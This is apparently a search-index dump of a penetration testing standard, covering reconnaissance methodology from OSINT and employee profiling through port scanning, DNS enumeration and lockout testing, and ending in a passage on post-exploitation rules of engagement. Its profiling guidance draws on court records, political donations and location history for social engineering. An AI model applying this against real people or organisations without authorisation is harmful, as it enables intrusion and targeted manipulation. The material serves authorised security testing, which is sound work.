General Electric and Proctor and Gamble own a great deal of smaller companies.","title":"Identification and Naming of Target"},{"location":"pentest_standard/ig/#consider-any-rules-of-engagement-limitations","text":"At this point it is a good idea to review the Rules of Engagement. It is common for these to get forgotten during a test. Sometimes, as testers we get so wrapped up in what we find and the possibilities for attack that we forget which IP addresses, domains and networks we can attack. Always, be referencing the Rulles of Engagement to keep your tests focused. This is not just important from a legel perspective, it is also important from a scope creep perspective. Every time you get sidetracked from the core objectives of the test it costs you time. And in the long run that can cost your company money.","title":"Consider any Rules of Engagement limitations"},{"location":"pentest_standard/ig/#consider-time-length-for-test","text":"The amount of time for the total test will directly impact the amount of Intelligence Gathering that can be done. There are some tests where the total time is two to three months. In these engagements a testing company would spend a tremendous amount of time looking into each of the core business units and personal of the company. However, for shorter crystal-box style tests the objectives may be far more tactical. For example, testing a specific web application may not require you to research the financial records of the company CEO.","title":"Consider time length for test"},{"location":"pentest_standard/ig/#consider-end-goal-of-the-test","text":"Every test has an end goal in mind - a particular asset or process that the organization considers critical. Having the end result in mind, the intelligence gathering phase should make sure to include all secondary and tertiary elements surrounding the end goal. Be it supporting technologies, 3 rd parties, relevant personnel, etc... Making sure the focus is kept on the critical assets assures that lesser relevant intelligence elements are de-prioritized and categorized as such in order to not intervene with the analysis process.","title":"Consider end goal of the test"},{"location":"pentest_standard/ig/#osint","text":"Open Source Intelligence (OSINT) takes three forms; Passive, Semi-passive, and Active. *'''Passive Information Gathering''': Passive Information Gathering is generally only useful if there is a very clear requirement that the information gathering activities never be detected by the target. This type of profiling is technically difficult to perform as we are never sending any traffic to the target organization neither from one of our hosts or \u201canonymous\u201d hosts or services across the Internet. This means we can only use and gather archived or stored information. As such this information can be out of date or incorrect as we are limited to results gathered from a third party. *'''Semi-passive Information Gathering''': The goal for semi-passive information gathering is to profile the target with methods that would appear like normal Internet traffic and behavior. We query only the published name servers for information, we aren\u2019t performing in-depth reverse lookups or brute force DNS requests, we aren\u2019t searching for \u201cunpublished\u201d servers or directories. We aren\u2019t running network level portscans or crawlers and we are only looking at metadata in published documents and files; not actively seeking hidden content. The key here is not to draw attention to our activities. Post mortem the target may be able to go back and discover the reconnaissance activities but they shouldn\u2019t be able to attribute the activity back to anyone. *'''Active Information Gathering''': Active information gathering should be detected by the target and suspicious or malicious behavior. During this stage we are actively mapping network infrastructure (think full port scans nmap \u2013p1-65535), actively enumerating and/or vulnerability scanning the open services, we are actively searching for unpublished directories, files, and servers. Most of this activity falls into your typically \u201creconnaissance\u201d or \u201cscanning\u201d activities for your standard pentest.","title":"OSINT"},{"location":"pentest_standard/ig/#corporate","text":"","title":"Corporate"},{"location":"pentest_standard/ig/#physical","text":"","title":"Physical"},{"location":"pentest_standard/ig/#locations-l1","text":"Per location listing of full address, ownership, associated records (city, tax, legal, etc), Full listing of all physical security measures for the location (camera placements, sensors, fences, guard posts, entry control, gates, type of identification, supplier\u2019s entrance, physical locations based on IP blocks/geolocation services, etc\u2026 For Hosts/NOC: Full CIDR notation of hosts and networks, full DNS listing of all associated assets, Full mapping of AS, peering paths, CDN provisioning, netblock owners (whois data), email records (MX + mail address structure) *Owner (L1/L2) *Land/tax records (L1/L2) *Shared/individual (L1/L2) *Timezones (L1/L2) *Hosts / NOC","title":"Locations (L1) ####"},{"location":"pentest_standard/ig/#pervasiveness-l1","text":"It is not uncommon for a target organization to have multiple separate physical locations. For example, a bank will have central offices, but they will also have numerous remote branches as well. While physical and technical security may be very good at central locations, remote locations often have poor security controls.","title":"Pervasiveness (L1)"},{"location":"pentest_standard/ig/#relationships-l1","text":"Business partners, customs, suppliers, analysis via whats openly shared on corporate web pages, rental companies, etc. This information can be used to better understand the business or organizational projects. For example, what products and services are critical to the target organization? Also, this information can also be used to create successful social engineering scenarios. *Relationships (L2/L3) *: Manual analysis to vet information from level 1, plus dig deeper into possible relationships. *Shared office space (L2/L3) *Shared infrastructure (L2/L3) *Rented / Leased Equipment (L2/L3)","title":"Relationships (L1) ####"},{"location":"pentest_standard/ig/#logical","text":"Accumulated information for partners, clients and competitors: For each one, a full listing of the business name, business address, type of relationship, basic financial information, basic hosts/network information. * Business Partners (L1/L2/L3) *: Target\u2019s advertised business partners. Sometimes advertised on main www. * Business Clients (L1/L2/L3) *: Target\u2019s advertised business clients. Sometimes advertised on main www. * Competitors (L1/L2/L3) *: Who are the target\u2019s competitors. This may be simple, Ford vs Chevy, or may require much more analysis. Touchgraph (L1) *: A touchgraph (visual representation of the social connections between people) will assist in mapping out the possible interactions between people in the organization, and how to access them from the outside (when a touchgraph includes external communities and is created with a depth level of above 2). *: The basic touchgraph should reflect the organizational structure derived from the information gathered so far, and further expansion of the graph should be based on it (as it usually represents the focus on the organizational assets better, and make possible approach vectors clear. Hoovers profile (L1/L2) *: What: a semi-open source intelligence resource (paid subscriptions usually). Such sources specialize in gathering business related information on companies, and providing a \u201cnormalized\u201d view on the business. *: Why: The information includes physical locations, competitive landscape, key personnel, financial information, and other business related data (depending on the source). This can be used to create a more accurate profile of the target, and identify additional personnel and 3 rd parties which can be used in the test. *: How: Simple search on the site with the business name provide the entire profile of the company and all the information that is available on it. Its recommended to use a couple of sources in order to cross reference them and make sure you get the most up-to-date information. (paid for service). Product line (L2/L3) *: Target's product offerings which may require additional analysis if the target does offer services as well this might require further analysis. Market Vertical (L1) *: Which industry the target resides in. i.e. financial, defense, agriculture, government, etc Marketing accounts (L2/L3) *: Marketing activities can provide a wealth of information on the marketing strategy of the target *: Evaluate all the social media Networks for the target's social personas *: Evaluate the target's past * marketing campaigns Meetings (L2/L3) *: Meeting Minutes published? *: Meetings open to public? Significant company dates (L1/L2/L3) *: Board meetings *: Holidays *: Anniversaries *: Product/service launch Job openings (L1/L2) *: By viewing a list of job openings at an organization (usually found in a \u2018careers\u2019 section of their website), you can determine types of technologies used within the organization. One example would be if an organization has a job opening for a Senior Solaris Sysadmin then it is pretty obvious that the organization is using Solaris systems. Other positions may not be as obvious by the job title, but an open Junior Network Administrator position may say something to the effect of \u2018CCNA preferred\u2019 or \u2018JNCIA preferred\u2019 which tells you that they are either using Cisco or Juniper technologies. Charity affiliations (L1/L2/L3) *: It is very common for executive members of a target organization to be associated with charitable organizations. This information can be used to develop solid social engineering scenarios for targeting executives. RFP, RFQ and other Public Bid Information (L1/L2) *: RFPs and RFQs often reveal a lot of information about the types of systems used by a company, and potentially even gaps or issues with their infrastructure. *: Finding out who current bid winners are may reveal the types of systems being used or a location where company file_suport might be hosted off-site. Court records (L2/L3) *: Court records are usually available either free or sometimes at a fee. *: Contents of litigation can reveal information about past complainants including but not limited to former employee lawsuits *: Criminal records of current and past employees may provide a list of targets for social engineering efforts Political donations (L2/L3) *: Mapping out political donations or other financial interests is important in order to identify pivotal individuals who may not be in obvious power positions but have a vested interest (or there is a vested interes in them). *: Political donation mapping will change between countries based on the freedom of information, but often cases donations from other countries can be traced back using the data available there. Professional licenses or registries (L2/L3) *: Gathering a list of your targets professional licenses and registries may offer an insight into not only how the company operated, but also the guidelines and regulations that they follow in order to maintain those licenses. A prime example of this is a companies ISO standard certification can show that a company follows set guidelines and processes. It is important for a tester to be aware of these processes and how they could affect tests being performed on the organization. *: A company will often list these details on their website as a badge of honor. In other cases it may be necessary to search registries for the given vertical in order to see if an organization is a member. The information that is available is very dependent on the vertical market, as well as the geographical location of the company. It should also be noted that international companies may be licensed differently and be required to register with different standards or legal bodies dependent on the country.","title":"Logical"},{"location":"pentest_standard/ig/#org-chart-l1","text":"Position identification ** Important people in the organization ** Individuals to specifically target Transactions ** Mapping on changes within the organization (promotions, lateral movements) Affiliates ** Mapping of affiliate organizations that are tied to the business","title":"Org Chart (L1)"},{"location":"pentest_standard/ig/#electronic","text":"","title":"Electronic"},{"location":"pentest_standard/ig/#document-metadata-l1l2","text":"*What it is? Metadata or meta-content provides information about the data/document in scope. It can have information such as author/creator name, time and date, standards used/referred, location in a computer network (printer/folder/directory path/etc. info), geo-tag etc. For an image its\u2019 metadata can contain color, depth, resolution, camera make/type and even the co-ordinates and location information. *Why you would do it? Metadata is important because it contains information about the internal network, user-names, email addresses, printer locations etc. and will help to create a blueprint of the location. It also contains information about software used in creating the respective documents. This can enable an attacker to create a profile and/or perform targeted attacks with internal knowledge on the networks and users. *How you would do it? There are tools available to extract the metadata from the file (pdf/word/image) like FOCA (GUI-based), metagoofil (python-based), meta-extractor, exiftool (perl-based). These tools are capable of extracting and displaying the results in different formats as HTML, XML, GUI, JSON etc. The input to these tools is mostly a document downloaded from the public presence of the \u2018client\u2019 and then analyzed to know more about it. Whereas FOCA helps you search documents, download and analyzes all through its GUI interface.","title":"Document Metadata (L1/L2)"},{"location":"pentest_standard/ig/#marketing-communications-l1l2","text":"Past marketing campaigns provide information for projects which might of been retired that might still be accessible. Current marketing communications contain design components (Colors, Fonts, Graphics etc..) which are for the most part used internally as well. Additional contact information including external marketing organizations.","title":"Marketing Communications (L1/L2)"},{"location":"pentest_standard/ig/#infrastructure-assets","text":"","title":"Infrastructure Assets"},{"location":"pentest_standard/ig/#network-blocks-owned-l1","text":"Network Blocks owned by the organization can be passively obtained from performing whois searches. DNSStuff.com is a one stop shop for obtaining this type of information. Open Source searches for IP Addresses could yield information about the types of infrastructure at the target. Administrators often post ip address information in the context of help requests on various support sites.","title":"Network blocks owned (L1)"},{"location":"pentest_standard/ig/#email-addresses-l1","text":"E-mail addresses provide a potential list of valid usernames and domain structure E-mail addresses can be gathered from multiple sources including the organizations website.","title":"Email addresses (L1)"},{"location":"pentest_standard/ig/#external-infrastructure-profile-l1","text":"The target's external infrastructure profile can provide immense information about the technologies used internally. This information can be gathered from multiple sources both passively and actively. The profile should be utilized in assembling an attack scenario against the external infrastructure.","title":"External infrastructure profile (L1)"},{"location":"pentest_standard/ig/#technologies-used-l1l2","text":"OSINT searches through support forums, mailing lists and other file_suport can gather information of technologies used at the target Use of Social engineering against the identified information technology organization Use of social engineering against product vendors","title":"Technologies used (L1/L2)"},{"location":"pentest_standard/ig/#purchase-agreements-l1l2l3","text":"Purchase agreements contain information about hardware, software, licenses and additional tangible asset in place at the target.","title":"Purchase agreements (L1/L2/L3)"},{"location":"pentest_standard/ig/#remote-access-l1l2","text":"Obtaining information on how employees and/or clients connect into the target for remote access provides a potential point of ingress. Often times link to remote access portal are available off of the target's home page How To documents reveal applications/procedures to connect for remote users","title":"Remote access (L1/L2)"},{"location":"pentest_standard/ig/#application-usage-l1l2","text":"Gather a list of known application used by the target organization. This can often be achieved by extracting metadata from publicly accessible files (as discussed previously)","title":"Application usage (L1/L2)"},{"location":"pentest_standard/ig/#defense-technologies-l1l2l3","text":"Fingerprinting defensive technologies in use can be achieved in a number of ways depending on the defenses in use.","title":"Defense technologies (L1/L2/L3)"},{"location":"pentest_standard/ig/#passive-fingerprinting","text":"Search forums and publicly accessible information where technicians of the target organisation may be discussing issues or asking for assistance on the technology in use Search marketing information for the target organisation as well as popular technology vendors Using Tin-eye (or another image matching tool) search for the target organisations logo to see if it is listed on vendor reference pages or marketing material","title":"Passive fingerprinting"},{"location":"pentest_standard/ig/#active-fingerprinting","text":"Send appropriate probe packets to the public facing systems to test patterns in blocking. Several tools exist for fingerprinting of specific WAF types. Header information both in responses from the target website and within emails often show information not only on the systems in use, but also the specific protection mechanisms enabled (e.g. Email gateway Anti-virus scanners)","title":"Active fingerprinting"},{"location":"pentest_standard/ig/#human-capability-l1l2l3","text":"Discovering the defensive human capability of a target organization can be difficult. There are several key pieces of information that could assist in judging the security of the target organization. Check for the presence of a company-wide CERT/CSIRT/PSRT team Check for advertised jobs to see how often a security position is listed Check for advertised jobs to see if security is listed as a requirement for non-security jobs (e.g. developers) Check for out-sourcing agreements to see if the security of the target has been outsourced partially or in it's entirety Check for specific individuals working for the company that may be active in the security community","title":"Human capability (L1/L2/L3)"},{"location":"pentest_standard/ig/#financial","text":"","title":"Financial"},{"location":"pentest_standard/ig/#reporting-l1l2","text":"The targets financial reporting will depend heavily on the location of the organization. Reporting may also be made through the organizations head office and not for each branch office. In 2008 the SEC issued a proposed roadmap for adoption of the International Financial Reporting Standards (IFRS) in the US. IFRS Adoption per country \u2192 http://www.iasplus.com/en/resources/use-of-ifrs","title":"Reporting (L1/L2)"},{"location":"pentest_standard/ig/#market-analysis-l1l2l3","text":"Obtain market analysis reports from analyst organizations (such as Gartner, IDC, Forrester, 541, etc...). This should include what the market definition is, market cap, competitors, and any major changes to the valuation, product, or company in general.","title":"Market analysis (L1/L2/L3)"},{"location":"pentest_standard/ig/#trade-capital","text":"Identify is the organization is allocating any trade capital, and in what percentage of the overall valuation and free capital it has. This will indicate how sensitive the organization is to market fluctuations, and whether it depends on external investment as part of it's valuation and cash flow.","title":"Trade capital"},{"location":"pentest_standard/ig/#value-history","text":"Charting of the valuation of the organization over time, in order to establish correlation between external and internal events, and their effect on the valuation.","title":"Value history"},{"location":"pentest_standard/ig/#edgar-sec","text":"*What is it: EDGAR (the Electronic Data Gathering, Analysis, and Retrieval system) is a database of the U.S. Security and Exchanges Commission (SEC) that contains registration statements, periodic reports, and other information of all companies (both foreign and domestic) who are required by law to file. *Why do it: EDGAR data is important because, in additional to financial information, it identifies key personnel within a company that may not be otherwise notable from a company\u2019s website or other public presence. It also includes statements of executive compensation, names and addresses of major common stock owners, a summary of legal proceedings against the company, economic risk factors, and other potentially interesting data. *How to obtain: The information is available on the SEC\u2019s EDGAR website ( http://www.sec.gov/edgar.shtml ). Reports of particular interest include the 10-K (annual report) and 10-Q (quarterly report).","title":"EDGAR (SEC)"},{"location":"pentest_standard/ig/#individual","text":"","title":"Individual"},{"location":"pentest_standard/ig/#employee","text":"","title":"Employee"},{"location":"pentest_standard/ig/#history","text":"*Court Records (L2/L3) **What is it: Court records are all the public records related to criminal and/or civil complaints, lawsuits, or other legal actions for or against a person or organization of interest. **Why you would do it: Court records could potentially reveal sensitive information related to an individual employee or the company as a whole. This information could be useful by itself or may be the driver for gaining additional information. It could also be used for social engineering or other purposes later on in the penetration test. **How you would do it: Much of this information is now available on the Internet via publicly available court websites and records databases. Some additional information may be available via pay services such as LEXIS/NEXIS. Some information may be available via records request or in person requests. *Political Donations (L2/L3) **What is it: Political donations are an individual\u2019s personal funds directed to specific political candidates, political parties, or special interest organizations. **Why you would do it: Information about political donations could potentially reveal useful information related to an individual. This information could be used as a part of social network analysis to help draw connections between individuals and politicians, political candidates, or other political organizations. It could also be used for social engineering or other purposes later on in the penetration test. **How you would do it: Much of this information is now available on the Internet via publicly available websites (i.e., http://www.opensecrets.org/ ) that track political donations by individual. Depending upon the laws of a given state, donations over a certain amount are usually required to be recorded. *Professional licenses or registries (L2/L3) **What is it: Professional licenses or registries are repositories of information that contain lists of members and other related information for individuals who have attained a particular license or some measure of specific affiliation within a community. **Why you would do it: Information about professional licenses could potentially reveal useful information related to an individual. This information could be used to validate an individual's trustworthiness (do they really have a particular certification as they claim) or as a part of social network analysisto help draw connections between individuals and other organizations. It could also be used for social engineering or other purposes later on in the penetration test. **How you would do it: Much of this information is now available on the Internet via publicly available websites. Typically, each organization maintains their own registry of information that may be available online or may require additional steps to gather.","title":"History"},{"location":"pentest_standard/ig/#social-network-socnet-profile","text":"*Metadata Leakage (L2/L3) **Location awareness via Photo Metadata *Tone (L2/L3) **Expected deliverable: subjective identification of the tone used in communications \u2013 aggressive, passive, appealing, sales, praising, dissing, condescending, arrogance, elitist, underdog, leader, follower, mimicking, etc\u2026 *Frequency (L2/L3) **Expected deliverable: Identification of the frequency of publications (once an hour/day/week, etc\u2026). Additionally - time of day/week in which communications are prone to happen. *Location awareness (L2/L3) *: Map location history for the person profiled from various sources, whether through direct interaction with applications and social networks, or through passive participation through photo metadata. **Bing Map Apps **Foursquare **Google Latitude **Yelp **Gowalla *Social Media Presence (L1/L2/L3) *: Verify target\u2019s social media account/presence (L1). And provide detailed analysis (L2/L3)","title":"Social Network (SocNet) Profile"},{"location":"pentest_standard/ig/#internet-presence","text":"*Email Address (L1) **What it is? Email addresses are the public mail box ids of the users. **Why you would do it? Email address harvesting or searching is important because it serves multiple purposes - provides a probable user-id format which can later be brute-forced for access but more importantly it helps sending targeted spams and even to automated bots. These spam emails can contain exploits, malware etc. and can be addressed with specific content particularly to a user. **How you would do it? Email addresses can be searched and extracted from various websites, groups, blogs, forums, social networking portals etc. These email addresses are also available from various tech support websites. There are harvesting and spider tools to perform search for email addresses mapped to a certain domain (if needed). *Personal Handles/Nicknames (L1) *Personal Domain Names registered (L1/L2) *Assigned Static IPs/Netblocks (L1/L2)","title":"Internet Presence"},{"location":"pentest_standard/ig/#physical-location","text":"*Physical Location **Can you derive the target's physical location","title":"Physical Location"},{"location":"pentest_standard/ig/#mobile-footprint","text":"Phone number (L1/L2/L3) Device type (L1/L2/L3) Use (L1/L2/L3) Installed applications (L1/L2/L3) Owner/administrator (L1/L2/L3)","title":"Mobile Footprint"},{"location":"pentest_standard/ig/#for-pay-information","text":"*Background Checks *For Pay Linked-In *LEXIS/NEXIS","title":"\"For Pay\" Information"},{"location":"pentest_standard/ig/#covert-gathering","text":"","title":"Covert Gathering"},{"location":"pentest_standard/ig/#corporate_1","text":"","title":"Corporate"},{"location":"pentest_standard/ig/#on-location-gathering","text":"Selecting specific locations for onsite gathering, and then performing reconnaissance over time (usually at least 2-3 days in order to assure patterns). The following elements are sought after when performing onsite intelligence gathering: * Physical security inspections * Wireless scanning / RF frequency scanning * Employee behavior training inspection * Accessible/adjacent facilities (shared spaces) * Dumpster diving * Types of equipment in use","title":"On-Location Gathering"},{"location":"pentest_standard/ig/#offsite-gathering","text":"Identifying offsite locations and their importance/relation to the organization. These are both logical as well as physical locations as per the below: * Data center locations * Network provisioning/provider","title":"Offsite Gathering"},{"location":"pentest_standard/ig/#humint","text":"Human intelligence complements the more passive gathering on the asset as it provides information that could not have been obtained otherwise, as well as add more \u201cpersonal\u201d perspectives to the intelligence picture (feelings, history, relationships between key individuals, \u201catmosphere\u201d, etc...) The methodology of obtaining human intelligence always involves direct interaction - whether physical, or verbal. Gathering should be done under an assumed identity, that would be created specifically to achieve optimal information exposure and cooperation from the asset in question. Additionally, intelligence gathering on more sensitive targets can be performed by utilizing observation only - again, either physically on location, or through electronic/remote means (CCTV, webcams, etc...). This is usually done in order to establish behavioral patterns (such as frequency of visitations, dress code, access paths, key locations that may provide additional access such as coffee shops).","title":"HUMINT"},{"location":"pentest_standard/ig/#results","text":"Key Employees Partners/Suppliers Social Engineering","title":"Results"},{"location":"pentest_standard/ig/#footprinting","text":"WHAT IT IS: External information gathering, also known as footprinting, is a phase of information gathering that consists of interaction with the target in order to gain information from a perspective external to the organization. WHY: Much information can be gathered by interacting with targets. By probing a service or device, you can often create scenarios in which it can be fingerprinted, or even more simply, a banner can be procured which will identify the device. This step is necessary to gather more information about your targets. Your goal, after this section, is a prioritized list of targets.","title":"Footprinting"},{"location":"pentest_standard/ig/#external-footprinting","text":"","title":"External Footprinting"},{"location":"pentest_standard/ig/#identify-customer-external-ranges","text":"One of the major goals of intelligence gathering during a penetration test is to determine hosts which will be in scope. There are a number of techniques which can be used to identify systems, including using reverse DNS lookups, DNS bruting, WHOIS searches on the domains and the ranges. These techniques and others are documented below.","title":"Identify Customer External Ranges"},{"location":"pentest_standard/ig/#passive-reconnaissance","text":"","title":"Passive Reconnaissance"},{"location":"pentest_standard/ig/#whois-lookups","text":"For external footprinting, we first need to determine which one of the WHOIS servers contains the information we're after. Given that we should know the TLD for the target domain, we simply have to locate the Registrar that the target domain is registered with. WHOIS information is based upon a tree hierarchy. ICANN (IANA) is the authoritative registry for all of the TLDs and is a great starting point for all manual WHOIS queries. ICANN - http://www.icann.org IANA - http://www.iana.com NRO - http://www.nro.net AFRINIC - http://www.afrinic.net APNIC - http://www.apnic.net ARIN - http://ws.arin.net LACNIC - http://www.lacnic.net RIPE - http://www.ripe.net Once the appropriate Registrar was queried we can obtain the Registrant information. There are numerous sites that offer WHOIS information; however for accuracy in documentation, you need to use only the appropriate Registrar. InterNIC - http://www.internic.net/ http://www.internic.net ] Typically, a simple whois against ARIN will refer you to the correct registrar.","title":"WHOIS Lookups"},{"location":"pentest_standard/ig/#bgp-looking-glasses","text":"It is possible to identify the Autonomous System Number (ASN) for networks that participate in Border Gateway Protocol (BGP). Since BGP route paths are advertised throughout the world we can find these by using a BGP4 and BGP6 looking glass. BGP4 - [ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg http://www.bgp4.as/looking-glasses ] BPG6 - [ http://lg.he.net/ http://lg.he.net/ ]","title":"BGP looking glasses"},{"location":"pentest_standard/ig/#active-footprinting","text":"","title":"Active Footprinting"},{"location":"pentest_standard/ig/#port-scanning","text":"Port scanning techniques will vary based on the amount of time available for the test, and the need to be stealthy. If there is zero knowledge of the systems, a fast ping scan can be used to identify systems. In addition, a quick scan without ping verification (-PN in nmap) should be run to detect the most common ports avialable. Once this is complete, a more comprehensive scan can be run. Some testers check for only open TCP ports, make sure to check UDP as well. The http://nmap.org/nmap_doc.html document details port scan types. Nmap (\"Network Mapper\") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. You can find more information on the use of Nmap for this purpose in the [ http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Nmap_.28Windows.2FLinux.29 PTES Technical Guideline] Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. IPv6 should also be tested.","title":"Port Scanning"},{"location":"pentest_standard/ig/#banner-grabbing","text":"Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports. Banner grabbing is used to identify network the version of applications and operating system that the target host are running. Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively. Tools commonly used to perform banner grabbing are Telnet, nmap, and Netcat.","title":"Banner Grabbing"},{"location":"pentest_standard/ig/#snmp-sweeps","text":"SNMP sweeps are performed too as they offer tons of information about a specific system. The SNMP protocol is a stateless, datagram oriented protocol. Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports. This means that \"no response\" from a probed IP address can mean either of the following: machine unreachable SNMP server not running invalid community string the response datagram has not yet arrived","title":"SNMP Sweeps"},{"location":"pentest_standard/ig/#zone-transfers","text":"DNS zone transfer, also known as AXFR, is a type of DNS transaction. It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR). There are numerous tools available to test the ability to perform a DNS zone transfer. Tools commonly used to perform zone transfers are host, dig and nmap.","title":"Zone Transfers"},{"location":"pentest_standard/ig/#smtp-bounce-back","text":"SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the sender of another message about a delivery problem. This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message. This can be done by simply creating a bogus address within the target's domain. For instance, asDFADSF_garbage_address@target.com could be used to test target.com. Gmail provides full access to the headers, making it an easy choice for testers.","title":"SMTP Bounce Back"},{"location":"pentest_standard/ig/#dns-discovery","text":"DNS discovery can be performed by looking at the WHOIS records for the domain's authoritative nameserver. Additionally, variations of the main domain name should be checked, and the website should be checked for references to other domains which could be under the target's control.","title":"DNS Discovery"},{"location":"pentest_standard/ig/#forwardreverse-dns","text":"Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address. If it does resolve then the results are returned. This is usually performed by testing the server with various IP addresses to see if it returns any results.","title":"Forward/Reverse DNS"},{"location":"pentest_standard/ig/#dns-bruteforce","text":"After identifying all the information that is associated with the client domain(s), it is now time to begin to query DNS. Since DNS is used to map IP addresses to hostnames, and vice versa we will want to see if it is insecurely configure. We will seek to use DNS to reveal additional information about the client. One of the most serious misconfigurations involving DNS is allowing Internet users to perform a DNS zone transfer. There are several tools that we can use to enumerate DNS to not only check for the ability to perform zone transfers, but to potentially discover additional host names that are not commonly known.","title":"DNS Bruteforce"},{"location":"pentest_standard/ig/#web-application-discovery","text":"Identifying weak web applications can be a particularly fruitful activity during a penetration test. Things to look for include OTS applications that have been misconfigured, OTS application which have plugin functionality (plugins often contain more vulnerable code than the base application), and custom applications. Web application fingerprinters such as WAFP can be used here to great effect.","title":"Web Application Discovery"},{"location":"pentest_standard/ig/#virtual-host-detection-enumeration","text":"Web servers often host multiple \"virtual\" hosts to consolidate functionality on a single server. If multiple servers point to the same DNS address, they may be hosted on the same server. Tools such as MSN search can be used to map an ip address to a set of virtual hosts.","title":"Virtual Host Detection &amp; Enumeration"},{"location":"pentest_standard/ig/#establish-external-target-list","text":"Once the activities above have been completed, a list of users, emails, domains, applications, hosts and services should be compiled.","title":"Establish External Target List"},{"location":"pentest_standard/ig/#mapping-versions","text":"Version checking is a quick way to identify application information. To some extent, versions of services can be fingerprinted using nmap, and versions of web applications can often be gathered by looking at the source of an arbitrary page.","title":"Mapping versions"},{"location":"pentest_standard/ig/#identifying-patch-levels","text":"To identify the patch level of services internally, consider using software which will interrogate the system for differences between versions. Credentials may be used for this phase of the penetration test, provided the client has acquiesced. Vulnerability scanners are particularly effective at identifying patch levels remotely, without credentials.","title":"Identifying patch levels"},{"location":"pentest_standard/ig/#looking-for-weak-web-applications","text":"Identifying weak web applications can be a particularly fruitful activity during a penetration test. Things to look for include OTS applications that have been misconfigured, OTS application which have plugin functionality (plugins often contain more vulnerable code than the base application), and custom applications. Web application fingerprinters such as WAFP can be used here to great effect.","title":"Looking for weak web applications"},{"location":"pentest_standard/ig/#identify-lockout-threshold","text":"Identifying the lockout threshold of an authentication service will allow you to ensure that your bruteforce attacks do not intentionally lock out valid users during your testing. Identify all disparate authentication services in the environment, and test a single, innocuous account for lockout. Often 5 - 10 tries of a valid account is enough to determine if the service will lock users out.","title":"Identify lockout threshold"},{"location":"pentest_standard/ig/#internal-footprinting","text":"","title":"Internal Footprinting"},{"location":"pentest_standard/ig/#passive-reconnaissance_1","text":"If the tester has access to the internal network, packet sniffing can provide a great deal of information. Use techniques like those implemented in p0f to identify systems.","title":"Passive Reconnaissance"},{"location":"pentest_standard/ig/#identify-customer-internal-ranges","text":"When performing internal testing, first enumerate your local subnet, and you can often extrapolate from there to other subnets by modifying the address slightly. Also, a look a the routing table of an internal host can be particularly telling. Below are a number of techniques which can be used. DHCP servers can be a potential source of not just local information, but also remote IP range and details of important hosts. Most DHCP servers will provide a local IP gateway address as well as the address of DNS and WINS servers. In Windows based networks, DNS servers tend to be Active Directory domain controllers, and thus targets of interest.","title":"Identify Customer Internal Ranges"},{"location":"pentest_standard/ig/#active-reconnaissance","text":"Internal active reconnaissance should contain all the elements of an external one, and in addition should focus on intranet functionality such as: * Directory services (Active Directory, Novell, Sun, etc...) * Intranet sites providing business functionality * Enterprise applications (ERP, CRM, Accounting, etc...) * Identification of sensitive network segments (accounting, R&D, marketing, etc...) * Access mapping to production networks (datacenters) * VoIP infrastructure * Authentication provisioning (kerberos, cookie tokens, etc...) * Proxying and internet access management","title":"Active Reconnaissance"},{"location":"pentest_standard/ig/#identify-protection-mechanisms","text":"The following elements should be identified and mapped according to the relevant location/group/persons in scope. This will enable correct application of the vulnerability research and exploitation to be used when performing the actual attack - thus maximizing the efficiency of the attack, and minimizing the detection ratio.","title":"Identify Protection Mechanisms"},{"location":"pentest_standard/ig/#network-based-protections","text":"\"Simple\" Packet Filters Traffic Shaping Devices DLP Systems Encryption/Tunneling","title":"Network Based Protections"},{"location":"pentest_standard/ig/#host-based-protections","text":"Stack/Heap Protections Application Whitelisting AV/Filtering/Behavioral Analysis DLP Systems","title":"Host Based Protections"},{"location":"pentest_standard/ig/#application-level-protections","text":"Identify Application Protections Encoding Options Potential Bypass Avenues Whitelisted Pages","title":"Application Level Protections"},{"location":"pentest_standard/ig/#storage-protections","text":"HBA - Host Level LUN Masking Storage Controller iSCSI CHAP Secret","title":"Storage Protections"},{"location":"pentest_standard/ig/#user-protections","text":"AV/Spam Filtering Software *: SW Configuration which limit exploitability can be considered antispam / antiAV","title":"User Protections"},{"location":"pentest_standard/postexploration/","text":"Purpose The purpose of the Post-Exploitation phase is to determine the value of the machine compromised and to maintain control of the machine for later use. The value of the machine is determined by the sensitivity of the data stored on it and the machines usefulness in further compromising the network. The methods described in this phase are meant to help the tester identify and document sensitive data, identify configuration settings, communication channels, and relationships with other network devices that can be used to gain further access to the network, and setup one or more methods of accessing the machine at a later time. In cases where these methods differ from the agreed upon Rules of Engagement, the Rules of Engagement must be followed. Rules of Engagement The following Rules of Engagement are specific to the Post-Exploitation phase of a penetration test and are intended to ensure that the client\u2019s systems are not subjected to unnecessary risk by the (direct or indirect) actions of the testers and to ensure a mutually agreed procedure to follow during the post-exploitation phase of the project. Protect the Client The following rules are to be used as a guideline of rules to establish with a client to ensure that the day to day operations and data of the client are not exposed to risk: *Unless previously agreed upon, there will be no modification of services which the client deems \u201ccritical\u201d to their infrastructure. The purpose of modifying such services would be to demonstrate to the client how an attacker may: **Escalate privileges **Gain access to specific data **Cause denial of service *All modifications, including configuration changes, executed against a system must be documented. After finishing the intended purpose of the modification, all settings should be returned to their original positions if possible. The list of changes should be given to the client after the engagement to allow them to ensure all changes were properly undone. Changes that could not be returned to their original positions should be clearly differentiated from changes that were successfully reversed. *A detailed list of actions taken against compromised systems must be kept. The list should include the action taken and the time period in which it occurred. Upon completion, this 